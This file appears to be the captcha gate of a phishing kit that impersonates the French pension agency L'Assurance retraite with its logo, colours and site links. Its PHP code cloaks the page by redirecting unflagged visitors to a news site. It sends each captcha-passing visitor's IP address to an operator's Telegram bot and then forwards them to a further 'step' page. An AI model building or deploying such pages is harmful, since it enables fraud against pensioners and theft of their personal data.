<?php
session_start();

$config = require 'config.php';
$botToken = $config['bot_token'];
$chatId = $config['chat_id'];

$visitor_ip = $_SERVER['REMOTE_ADDR'];

if (!isset($_SESSION['MASTER']) || $_SESSION['MASTER'] !== true) {
    header("Location: https://www.lemonde.fr/");
    exit;
}

if (!isset($_SESSION['captcha_result']) || $_SERVER['REQUEST_METHOD'] !== 'POST') {
    $a = rand(1, 9);
    $b = rand(1, 9);
    $_SESSION['captcha_result'] = $a + $b;
    $_SESSION['captcha_question'] = "$a + $b = ?";
}

$captcha_message = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user_result = intval($_POST['captcha'] ?? '');

    if ($user_result === $_SESSION['captcha_result']) {
        $_SESSION['qsdfqsdfqsdfqsdf123123'] = true;

        $message = "🔓 Nouveau captcha validé avec succès ! ->\n├ 🌐 IP : $visitor_ip";

        file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));

        header("Location: step/z.php");
        exit;
    } else {
        $captcha_message = '<p style="color: red; text-align: center; margin-top: 20px;">❌ Captcha incorrect.</p>';
    }

    $a = rand(1, 9);
    $b = rand(1, 9);
    $_SESSION['captcha_result'] = $a + $b;
    $_SESSION['captcha_question'] = "$a + $b = ?";
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Vérification - L'Assurance retraite</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Open Sans', sans-serif;
        }

        body {
            background: #F5F5F5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Header with Navigation */
        header {
            background: white;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
        }

        .header-top {
            background: #003d7a;
            padding: 8px 0;
        }

        .header-main {
            padding: 16px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            max-width: 1200px;
            margin: 0 auto;
        }

        .logo-container {
            display: flex;
            align-items: center;
        }

        .logo {
            height: 60px;
            width: auto;
        }

        .nav-icons {
            display: flex;
            gap: 20px;
            align-items: center;
            justify-content: center;
            flex: 1;
            margin-left: 40px;
            transition: transform 0.3s ease-in-out;
            flex-wrap: nowrap;
        }

        .nav-icon span {
            white-space: nowrap;
        }

        .nav-icon {
            display: flex;
            flex-direction: row;
            align-items: center;
            text-decoration: none;
            color: #003d7a;
            font-size: 13px;
            font-weight: 500;
            transition: all 0.3s;
            padding: 8px 12px;
            border-radius: 8px;
            gap: 8px;
        }

        .nav-icon:hover {
            background: #E6F2FF;
            color: #FF5E00;
        }

        .nav-icon img {
            width: 20px;
            height: 20px;
        }

        .hamburger {
            display: none;
            flex-direction: column;
            cursor: pointer;
            gap: 4px;
            z-index: 1001;
        }

        .hamburger span {
            width: 25px;
            height: 3px;
            background: #003d7a;
            border-radius: 3px;
            transition: all 0.3s;
        }

        .hamburger.active span:nth-child(1) {
            transform: rotate(45deg) translate(6px, 6px);
        }

        .hamburger.active span:nth-child(2) {
            opacity: 0;
        }

        .hamburger.active span:nth-child(3) {
            transform: rotate(-45deg) translate(6px, -6px);
        }

        /* Main Content */
        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .captcha-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
            padding: 48px 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }

        .captcha-logo {
            width: 180px;
            margin: 0 auto 32px;
            display: block;
        }

        h1 {
            color: #003d7a;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 16px;
        }

        .description {
            color: #666;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 32px;
        }

        .captcha-form {
            position: relative;
        }

        .canvas-container {
            margin-bottom: 24px;
            background: #F5F5F5;
            padding: 16px;
            border-radius: 8px;
            display: inline-block;
        }

        canvas {
            font-size: 18px;
            font-weight: 600;
        }

        .input-group {
            display: flex;
            gap: 12px;
            margin-top: 24px;
        }

        input[type="tel"] {
            flex: 1;
            padding: 14px 16px;
            border: 2px solid #E0E0E0;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: all 0.3s;
        }

        input[type="tel"]:focus {
            border-color: #003d7a;
        }

        button {
            background: #003d7a;
            color: white;
            border: none;
            padding: 14px 32px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        button:hover {
            background: #FF5E00;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 94, 0, 0.3);
        }

        .security-notice {
            margin-top: 32px;
            padding: 16px;
            background: #E6F2FF;
            border-radius: 8px;
            font-size: 13px;
            color: #003d7a;
            line-height: 1.5;
        }

        /* Footer */
        footer {
            background: #003d7a;
            color: white;
            text-align: center;
            padding: 24px;
            font-size: 14px;
        }

        /* Responsive */
        @media screen and (max-width: 768px) {
            .header-main {
                position: relative;
            }

            .nav-icons {
                position: fixed;
                top: 0;
                right: -100%;
                width: 320px;
                height: 100vh;
                background: white;
                flex-direction: column;
                align-items: stretch;
                box-shadow: -2px 0 10px rgba(0, 0, 0, 0.1);
                padding: 20px 0 20px;
                margin-left: 0;
                gap: 0;
                z-index: 1000;
                overflow-y: auto;
            }

            .nav-icons.active {
                right: 0;
            }

            .nav-icon {
                width: 100%;
                padding: 18px 24px;
                border-radius: 0;
                border-bottom: 1px solid #E0E0E0;
                justify-content: flex-start;
                flex-shrink: 0;
                font-size: 16px;
                line-height: 1.5;
                min-height: 60px;
            }

            .nav-icon span {
                display: inline;
            }

            .nav-icon img {
                width: 24px;
                height: 24px;
            }

            .hamburger {
                display: flex;
            }

            .captcha-container {
                padding: 32px 24px;
            }

            /* Hide captcha logo on mobile only */
            .captcha-logo {
                display: none;
            }

            .input-group {
                flex-direction: column;
            }

            button {
                width: 100%;
                justify-content: center;
            }

            .logo {
                height: 45px;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header>
        <div class="header-top"></div>
        <div class="header-main">
            <div class="logo-container">
                <img src="https://www.lassuranceretraite.fr/portail-info/files/live/sites/pub/files/newlogo.png" alt="L'Assurance retraite" class="logo">
            </div>
            <nav class="nav-icons" id="navMenu">
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/autre/questions-frequentes.html" class="nav-icon">
                    <img src="assets/icons/FAQ.png" alt="FAQ">
                    <span>Questions fréquentes</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/footer/contacts.html" class="nav-icon">
                    <img src="assets/icons/contact.png" alt="Contact">
                    <span>Nous contacter</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/nous-connaitre.html" class="nav-icon">
                    <img src="assets/icons/logo AR.png" alt="Nous connaître">
                    <span>Nous connaître</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/entreprise.html" class="nav-icon">
                    <img src="assets/icons/entreprise.png" alt="Entreprise">
                    <span>Entreprise</span>
                </a>
                <a href="https://www.lassuranceretraite.fr/portail-info/hors-menu/annexe/sourd-malentendant-contact.html" class="nav-icon">
                    <img src="assets/icons/malentendant.png" alt="Sourd">
                    <span>Sourd - Malentendant</span>
                </a>
            </nav>
            <div class="hamburger" onclick="toggleMenu()">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main>
        <div class="captcha-container">
            <img src="https://www.lassuranceretraite.fr/portail-info/files/live/sites/pub/files/newlogo.png" alt="Logo" class="captcha-logo">
            
            <h1>Êtes-vous un humain ?</h1>
            <p class="description">
                Veuillez résoudre ce simple calcul mathématique pour confirmer que vous êtes un humain et non un robot.
            </p>

            <?= $captcha_message ?? '' ?>

            <form method="POST" action="" class="captcha-form">
                <div class="canvas-container">
                    <canvas class="captcha-canvas" width="120" height="30"></canvas>
                </div>
                
                <div class="input-group">
                    <input type="tel" name="captcha" placeholder="Tapez le résultat" required autofocus>
                    <button type="submit">
                        <span>Valider</span>
                        <span>→</span>
                    </button>
                </div>
            </form>

            <div class="security-notice">
                Cette page est protégée pour assurer la sécurité et prévenir les abus.
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer>
        © <?= date('Y') ?> L'Assurance retraite - Tous droits réservés
    </footer>

    <script>
        // Toggle mobile menu
        function toggleMenu() {
            const menu = document.getElementById('navMenu');
            const hamburger = document.querySelector('.hamburger');
            menu.classList.toggle('active');
            hamburger.classList.toggle('active');
        }

        // Close menu when clicking outside
        document.addEventListener('click', function(event) {
            const menu = document.getElementById('navMenu');
            const hamburger = document.querySelector('.hamburger');
            const isClickInsideMenu = menu.contains(event.target);
            const isClickOnHamburger = hamburger.contains(event.target);
            
            if (!isClickInsideMenu && !isClickOnHamburger && menu.classList.contains('active')) {
                menu.classList.remove('active');
                hamburger.classList.remove('active');
            }
        });

        const canvas = document.querySelector(".captcha-canvas");
        const ctx = canvas.getContext("2d");
        ctx.font = "bold 20px 'Open Sans', Arial";
        ctx.fillStyle = "#003d7a";
        ctx.textAlign = "center";
        ctx.textBaseline = "middle";
        ctx.fillText("<?= $_SESSION['captcha_question'] ?>", 60, 15);
    </script>
</body>
</html>
